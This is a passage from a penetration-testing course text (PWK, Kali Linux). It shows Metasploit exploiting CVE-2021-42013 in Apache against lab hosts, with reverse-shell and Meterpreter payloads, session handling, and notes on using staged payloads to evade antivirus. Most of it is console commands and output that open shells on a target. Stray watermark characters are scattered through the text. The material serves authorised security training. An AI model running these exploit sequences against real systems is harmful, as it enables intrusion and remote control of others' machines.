type:host:port[,type:host:port][...]
RHOSTS yes The target host(s), see
https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
RPORT 443 yes The target port (TCP)
SSL true no Negotiate SSL/TLS for outgoing connections
TARGETURI /cgi-bin yes Base path y
VHOST no HTTP server virtual host
k
Payload options (linux/x64/meterpreter/reverse_tcp):
Name Current Setting Required Description
s
---- --------------- -------- -----------
LHOST yes The listen address (an interface may be
specified) o
LPORT 4444 yes The listen port
... n
Listing 643 - Display the options of the exploit module
The options shown in Listing 643 aire similar to the options available for the auxiliary modules
from the previous section. Howezver, for exploit modules, there is an additional option section
named Payload options. If we don’t set this, the module will select a default payload. The default
payload may not be what we want or expect, so it’s always better to set our options explicitly to
D
maintain tight control of the exploitation process.
We’ll cover different payloads in the next Learning Unit, but for now we set it to a regular TCP
reverse shell. We can select a payload with set payload and the payload name, in our case
payload/linux/x64/shell_reverse_tcp. In addition, we enter the IP address of our Kali machine for
LHOST.
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload
payload/linux/x64/shell_reverse_tcp
payload => linux/x64/shell_reverse_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > show options
...
Payload options (linux/x64/shell_reverse_tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
LHOST 192.168.119.2 yes The listen address (an interface may be
specified)
LPORT 4444 yes The listen port
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 650
Made in Morocco
Penetration Testing with Kali Linux
...
Listing 644 - Set payload of the exploit module
The output shows that the entered payload is now active for the exploit module. There are two
options for this payload named LHOST (the local host IP address or interface) and LPORT (the
local port), which are used for the reverse shell to connect to.
By default, most exploit modules use the port 4444 in the LPORT payload option. Depending on
our machine’s configuration, Metasploit may already set the LHOST value for us. We should
always double-check this value, especially if our machine contains multiple interfaces, because
Metasploit may reference the wrong interface to set this value.
In real penetration tests we may face the situation that port 4y444 is blocked by
firewalls or other security technologies. This is quite common as it is the default
port for Metasploit’s modules. In situations like this, changing the port number to
k
ports associated with more commonly used protocols such as HTTP or HTTPS
may lead to a successful execution of the selected payload.
s
We should note that we don’t need to start a lisotener manually with tools such as Netcat980 to
receive the incoming reverse shell. Metasploit automatically sets up a listener matching the
specified payload.
n
Now, let’s set the options SSL to false and RPORT to 80 since the target Apache web server runs
on port 80 without HTTPS. Then, wei set RHOSTS to the target IP and enter run.
z
msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
SSL => false
D
msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 80
RPORT => 80
msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS 192.168.50.16
RHOSTS => 192.168.50.16
msf6 exploit(multi/http/apache_normalize_path_rce) > run
[*] Started reverse TCP handler on 192.168.119.2:4444
[*] Started reverse TCP handler on 192.168.119.4:4444
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is
enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
[*] http://192.168.50.16:80 - Sending linux/x64/shell_reverse_tcp command payload
[*] Command shell session 2 opened (192.168.119.4:4444 -> 192.168.50.16:35534) at
2022-08-08 05:13:45 -0400
[!] This exploit may require manual cleanup of '/tmp/ruGC' on the target
980 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Netcat
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 651
Made in Morocco
Penetration Testing with Kali Linux
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Listing 645 - Running the exploit module
Once launched, the exploit module first starts a listener on port 4444 and uses the previously
shown auxiliary module to check if the target is indeed vulnerable. In our case, it is vulnerable as
shown in Listing 645. Then, the vulnerability is exploited and the payload is sent. The console
states that a session is opened, and we have obtained command execution.
Before we head to the next section, let’s explore the concept of sessions981 and jobs in Metasploit.
Sessions are used to interact and manage access to successfully exploited targets, while jobs are
used to run modules or features in the background.
C z
When we launched the exploit with run, a session was created and we obtained an interactive
y
shell. We can send the session to the background by pressing + and confirming the
prompt. Once the session is sent to the background, we can use sessions -l to list all active
sessions. k
^Z
s
Background session 2? [y/N] y
msf6 exploit(multi/http/apache_normalize_patho_rce) > sessions -l
Active sessions
=============== n
Id Name Type Information Connection
-- ---- ---- ---i-------- ----------
... z
2 shell x64/linux 192.168.119.4:4444 -> 192.168.50.16:35534
(192.168.50.16)
D
Listing 646 - Backgrounding a session and listing all currently active sessions
The output provides us information about the target and payload in use. This makes it easy for us
to identify which session manages access to which target.
We can interact with the session again by passing the session ID to sessions -i.
msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -i 2
[*] Starting interaction with 2...
uname -a
Linux c1dbace7bab7 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022
x86_64 x86_64 x86_64 GNU/Linux
Listing 647 - Interacting with the previously backgrounded session
Listing 647 shows that we can again enter commands in the interactive shell. We can kill a
session with sessions -k and the ID as argument.
981 (Rapid7 Documentation, 2022), https://docs.rapid7.com/metasploit/manage-meterpreter-and-shell-sessions/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 652
Made in Morocco
Penetration Testing with Kali Linux
Instead of launching an exploit module and sending the resulting session to the background, we
can use run -j to launch it in the context of a job. This way, we’ll still find the output of launching
the exploit module, but we’ll need to interact with the resulting session before we can access it.
Let’s zoom out here for a moment and discuss why working with sessions and jobs is vital in a
real penetration test. In an assessment, we’ll face numerous targets and it is very easy to lose
track of machines we already have access to. Using an exploit framework like Metasploit helps us
manage access to these machines.
If we want to execute commands on a specific system, we don’t have to search through various
terminals to find the correct Netcat listener, we can just interact with the specific session. We can
launch exploit modules with run -j in the background and Metasploit will automatically create a
session for us while we already work on the next target.
In addition, Metasploit also stores information about targets, module results, and vulnerabilities in
y
the database, which are invaluable for further steps in a penetration test and writing the report for
the client.
k
Using exploit modules in Metasploit is a straightforward process. As we learned in the Modules
Locating Public Exploits and Fixing Exploits, working wsith public exploits may require a lot of
modification to get them working. This quite differs for exploit modules in Metasploit. Once we
find the correct exploit module, understand the implications of it, and set the options, we can
o
launch the exploit. Metasploit also sets up the correct listener to provide us interactive shell
access, depending on the payload we set.
n
The payload determines what happens on a system after a vulnerability is exploited. In the
example of this section, we chose a common 64-bit Linux TCP reverse shell. However, Metasploit
contains various other payloads. Deipending on our needs, we have to understand what payload
to set and how to configure it. In zthe next Learning Unit, we’ll explore the most important payload
types offered by Metasploit.
D
20.2 Using Metasploit Payloads
This Learning Unit covers the following Learning Objectives:
• Understand the differences between staged and non-staged payloads
• Explore the Meterpreter payload
• Create executable payloads
In the previous Learning Unit, we leveraged linux/x64/shell_reverse_tcp as a payload for an exploit
module. Metasploit contains numerous other payloads targeting different operating systems and
architectures. In addition, Metasploit contains many other payload types beyond basic shells
performing different operations on the target. Furthermore, the framework is also capable of
generating various file types containing payloads to perform certain operations, such as starting a
reverse shell. In this Learning Unit, we’ll discuss staged vs non-staged payloads, explore a special
kind of payload named Meterpreter,982 and explore executable files containing payloads.
982 (Metasploit Documentation, 2022), https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 653
Made in Morocco
Penetration Testing with Kali Linux
20.2.1 Staged vs Non-Staged Payloads
In this section, we’ll explore the differences between staged and non-staged payloads. Let’s
assume we’ve identified a buffer overflow vulnerability in a service. As we learned in Fixing
Exploits, we need to be aware of the buffer size our shellcode will be stored in. If the shellcode
size of our exploit exceeds the buffer size, our exploit attempt will fail. In a situation like this, it’s
vital which payload type we choose: staged or non-staged.
The difference between these payload types is subtle but important. A non-staged payload is sent
in its entirety along with the exploit. This means the payload contains the exploit and full
shellcode for a selected task. In general, these “all-in-one” payloads are more stable. The
downside is that the size of these payloads will be bigger than other types.
In contrast, a staged payload is usually sent in two parts. The first part contains a small primary
payload that causes the victim machine to connect back to they attacker, transfer a larger
secondary payload containing the rest of the shellcode, and then execute it.
k
There are several situations in which we would prefer to use a staged payload instead of non-
staged. If there are space-limitations in an exploit, a staged payload might be a better choice as it
is typically smaller. In addition, we need to keep in msind that antivirus software can detect
shellcode in an exploit. By replacing the full code with a first stage, which loads the second and
malicious part of the shellcode, the remaining paoyload is retrieved and injected directly into the
victim machine’s memory. This may prevent detection and can increase our chances of success.
Now that we have a basic understanding onf these two types of payloads, let’s get our hands dirty.
For this, we’ll use the same exploit module as in the previous section and enter show payloads to
get a list of all payloads that are compatible with the currently selected exploit module.
i
msf6 exploit(multi/http/apachez_normalize_path_rce) > show payloads
Compatible Payloads
===================
D
# Name Disclosure Date Rank
Check Description
- ---- --------------- ---- ----
- -----------
...
15 payload/linux/x64/shell/reverse_tcp normal No
Linux Command Shell, Reverse TCP Stager
...
20 payload/linux/x64/shell_reverse_tcp normal No
Linux Command Shell, Reverse TCP Inline
...
Listing 648 - Display compatible payloads of the exploit module
Listing 648 shows us the payload we used before at index 20. In Metasploit, the “/” character is
used to denote whether a payload is staged or not, so shell_reverse_tcp at index 20 is not staged,
whereas shell/reverse_tcp at index 15 is.
Let’s use the staged payload for this exploit module and launch it. We should note that Metasploit
will reuse the values for the options from the previous payload.
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 15
payload => linux/x64/shell/reverse_tcp
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 654
Made in Morocco
Penetration Testing with Kali Linux
msf6 exploit(multi/http/apache_normalize_path_rce) > run
[*] Started reverse TCP handler on 192.168.119.4:4444
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is
enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
[*] http://192.168.50.16:80 - Sending linux/x64/shell/reverse_tcp command payload
[*] Sending stage (38 bytes) to 192.168.50.16
[!] Tried to delete /tmp/EqDPZD, unknown result
[*] Command shell session 3 opened (192.168.119.4:4444 -> 192.168.50.16:35536) at
2022-08-08 05:18:36 -0400
id y
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Listing 649 - Use staged TCP reverse shell payload and launch exploit module
k
Listing 649 shows that we successfully obtained a reverse shell by using the staged payload. The
output states that the sent stage was only 38 bytes in size, making it a great choice when we
s
attempt to exploit a vulnerability with space constraints.
Obtaining a reverse shell with a staged payloaod concludes this section. We discussed the
differences of staged and non-staged payloads and used a staged payload to launch an exploit
module.
n
In the examples so far, there have been only minor differences between staged and non-staged
payloads since Metasploit did the heavy lifting for us in the background. In both situations, we
i
were provided with a session on the target machine. In the last section of this Learning Unit, we’ll
z
manually set up listeners and further review the differences of both payload types.
20.2.2 MeterpretDer Payload
In the previous sections, we used a common TCP reverse shell. While we do have interactive
access on a target system with this type of payload, we only have the functionality of a regular
command shell. Exploit frameworks often contain more advanced payloads providing features
and functionality such as file transfers, pivoting, and various other methods of interacting with the
victim machine.
Metasploit contains the Meterpreter983 payload, which is a multi-function payload that can be
dynamically extended at run-time. The payload resides entirely in memory on the target and its
communication is encrypted by default. Meterpreter offers capabilities that are especially useful
in the post-exploitation phase and exists for various operating systems such as Windows, Linux,
macOS, Android, and more.
Let’s display all compatible payloads in the exploit module from the previous sections again and
search for Meterpreter payloads. Once we find a non-staged 64-bit Meterpreter TCP reverse shell
payload, we’ll activate it and display its options.
983 (Metasploit Documentation, 2022), https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 655
Made in Morocco
Penetration Testing with Kali Linux
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
Compatible Payloads
===================
# Name Disclosure Date Rank
Check Description
- ---- --------------- ---- ----
- -----------
...
7 payload/linux/x64/meterpreter/bind_tcp normal No
Linux Mettle x64, Bind TCP Stager
8 payload/linux/x64/meterpreter/reverse_tcp normal No
Linux Mettle x64, Reverse TCP Stager
9 payload/linux/x64/meterpreter_reverse_http normal No
Linux Meterpreter, Reverse HTTP Inline y
10 payload/linux/x64/meterpreter_reverse_https normal No
Linux Meterpreter, Reverse HTTPS Inline
k
11 payload/linux/x64/meterpreter_reverse_tcp normal No
Linux Meterpreter, Reverse TCP Inline
...
s
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 11
payload => linux/x64/meterpreter_reverse_tcp o
msf6 exploit(multi/http/apache_normalize_path_rce) > show options
... n